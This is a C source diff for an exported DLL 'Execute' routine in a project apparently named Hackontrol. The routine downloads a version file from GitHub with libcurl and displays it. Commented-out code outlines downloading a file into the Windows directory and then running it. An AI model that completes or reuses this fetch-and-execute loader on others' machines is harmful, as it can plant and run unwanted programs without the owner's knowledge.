@@ -7,6 +7,55 @@
 
 //void executeProgram();
 
+static size_t write_data(BYTE* data, size_t size, size_t count, void** dataPointer) {
+	if(!dataPointer) {
+		return 0;
+	}
+
+	BYTE* outputBuffer = *dataPointer;
+	size_t length = size * count;
+
+	if(!outputBuffer) {
+		BYTE* result = malloc(length + 1);
+
+		if(!result) {
+			dialogError(ERROR_OUTOFMEMORY, L"malloc");
+			return 0;
+		}
+
+		for(size_t i = 0; i < length; i++) {
+			result[i] = data[i];
+		}
+
+		result[length] = 0;
+		*dataPointer = result;
+		return length;
+	}
+
+	size_t previousLength = strlen(outputBuffer);
+	size_t resultLength = previousLength + length;
+	BYTE* result = malloc(resultLength + 1);
+
+	if(!result) {
+		dialogError(ERROR_OUTOFMEMORY, L"malloc");
+		return 0;
+	}
+
+	for(size_t i = 0; i < previousLength; i++) {
+		result[i] = outputBuffer[i];
+	}
+
+	free(outputBuffer);
+
+	for(size_t i = 0; i < length; i++) {
+		result[i + previousLength] = data[i];
+	}
+
+	result[resultLength] = 0;
+	*dataPointer = result;
+	return length;
+}
+
 EXPORT(Execute) {
 	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);
 
@@ -70,9 +119,42 @@ EXPORT(Execute) {
 		goto globalCleanup;
 	}
 
-	//CURL* curl = HU_InitializeCURL();
-	/*const char* versionFile = HU_GetVersionFile(curl);
-	rapidjson::Document document;
+	code = curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/version.json");
+
+	if(code != CURLE_OK) {
+		curlError(code, L"curl_easy_setopt");
+		goto easyCleanup;
+	}
+
+	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+
+	if(code != CURLE_OK) {
+		curlError(code, L"curl_easy_setopt");
+		goto easyCleanup;
+	}
+
+	void* versionFile = NULL;
+	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &versionFile);
+
+	if(code != CURLE_OK) {
+		curlError(code, L"curl_easy_setopt");
+		goto easyCleanup;
+	}
+
+	code = curl_easy_perform(curl);
+
+	if(code != CURLE_OK) {
+		curlError(code, L"curl_easy_perform");
+		goto easyCleanup;
+	}
+
+	if(!versionFile) {
+		MessageBoxW(NULL, L"Empty version file buffer", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+		goto easyCleanup;
+	}
+
+	//const char* versionFile = HU_GetVersionFile(curl);
+	/*rapidjson::Document document;
 	document.Parse(versionFile);
 
 	if(!document.HasMember("hash")) {
@@ -157,7 +239,9 @@ EXPORT(Execute) {
 	downloadFileInternal(curl, downloadURL, filePath, TRUE);
 	free(filePath);
 	executeProgram();*/
-	MessageBoxW(NULL, fileNameBuffer, L"Execute", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	MessageBoxA(NULL, versionFile, "Execute", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	free(versionFile);
+easyCleanup:
 	curl_easy_cleanup(curl);
 globalCleanup:
 	curl_global_cleanup();
